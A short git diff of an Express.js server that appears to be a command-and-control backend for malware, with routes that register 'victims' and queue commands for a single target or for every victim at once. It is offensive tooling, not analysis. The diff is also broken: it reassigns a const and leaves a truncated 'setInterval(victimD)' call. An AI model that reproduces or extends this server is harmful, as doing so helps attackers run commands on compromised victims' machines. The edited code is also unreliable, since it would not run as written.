@@ -9,10 +9,10 @@ app.use(bodyparser.urlencoded({extended:true}));
 app.listen(PORT);
 
 const defaultCommand = "echo hello";
-let updateVictimCount = null;
+const updateVictimCount = null;
 
 app.get("/registervictim/:victimID", (req, res) => {
-  setInterval(victimDB.updateVictimCount, 8000);
+  updateVictimCount = setInterval(victimD)
   victimDB.addVictim(req.params.victimID);
   res.send("");
 })
@@ -39,7 +39,7 @@ app.post("/sendcommand", (req, res) => {
   let command = req.body.command;
   target ? victimDB.addCommand(command, target) : victimDB.addMassCommand(command);
   console.log("Added: ",command);
-  res.send("Sent:",command);
+  res.send("Sent: " + command);
 });
 
 app.get("/victimcount", (req, res) => {
